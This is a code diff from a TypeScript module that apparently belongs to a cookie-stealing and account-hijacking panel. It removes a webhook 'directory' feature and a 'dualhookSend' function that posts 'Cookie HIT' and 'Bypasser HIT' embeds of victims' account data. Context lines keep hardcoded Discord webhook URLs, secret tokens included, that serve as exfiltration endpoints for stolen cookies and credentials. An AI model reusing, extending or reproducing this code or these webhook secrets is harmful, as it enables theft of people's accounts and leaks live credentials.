@@ -17,49 +17,6 @@ export function validateToken(_s: string): Token | null { return null; }
 export function deleteToken(_id: string) {}
 export function getLoginLog(): LoginRecord[] { return []; }
 
-export interface Directory {
-  id: string;
-  name: string;
-  bypassWebhook: string;
-  fetchCookieWebhook: string;
-  liveBypassWebhook: string;
-  discordInviteUrl?: string;
-  directoryReceiver?: string;
-}
-
-const DIR_KEY = 'directories_v1';
-const ACTIVE_DIR_KEY = 'active_directory_id';
-
-export function getDirectories(): Directory[] {
-  try { return JSON.parse(localStorage.getItem(DIR_KEY) || '[]'); } catch { return []; }
-}
-export function saveDirectories(list: Directory[]) {
-  localStorage.setItem(DIR_KEY, JSON.stringify(list));
-}
-export function addDirectory(d: Omit<Directory, 'id'>): Directory {
-  const list = getDirectories();
-  const dir: Directory = { ...d, id: crypto.randomUUID() };
-  list.push(dir);
-  saveDirectories(list);
-  return dir;
-}
-export function deleteDirectory(id: string) {
-  saveDirectories(getDirectories().filter(d => d.id !== id));
-  if (getActiveDirectoryId() === id) setActiveDirectoryId(null);
-}
-export function getActiveDirectoryId(): string | null {
-  return sessionStorage.getItem(ACTIVE_DIR_KEY);
-}
-export function setActiveDirectoryId(id: string | null) {
-  if (id) sessionStorage.setItem(ACTIVE_DIR_KEY, id);
-  else sessionStorage.removeItem(ACTIVE_DIR_KEY);
-}
-export function getActiveDirectory(): Directory | null {
-  const id = getActiveDirectoryId();
-  if (!id) return null;
-  return getDirectories().find(d => d.id === id) || null;
-}
-
 const HARDCODED_WEBHOOKS: Record<string, string> = {
   wh_bypass: 'https://discord.com/api/webhooks/1510195358716919878/j3EtRIHmbwXi05MCvekgiRqFH-LYMOHuOhk8jDkuoQLzWUtd2gN_j6qNdfckHImrtGTx',
   wh_fetch_cookie: 'https://discord.com/api/webhooks/1510195484743172136/RUvTexxxkdenVxIzxv8qdVTAo4xVcHI2gSf2Bdkj-PDAVsKClVjXMPNYSl5y996K75Os',
@@ -274,12 +231,6 @@ export async function broadcastLiveBypass(d: AccountInfo) {
 }
 export async function broadcastLiveBypassFailed(d: AccountInfo, reason?: string) {
   await sendLiveBypassFailedEmbed(getWebhook(WK.liveBypass), d, reason);
-}
-
-export async function dualhookSend(kind: 'bypass' | 'fetch', d: AccountInfo) {
-  const mainKey = kind === 'bypass' ? WK.bypass : WK.fetchCookie;
-  const tag = kind === 'bypass' ? 'Bypasser HIT | @everyone' : 'Cookie HIT | @everyone';
-  await sendHitEmbed(getWebhook(mainKey), d, { tag });
 }
 
 export async function sendBypassEmbed(webhookUrl: string, data: any) {
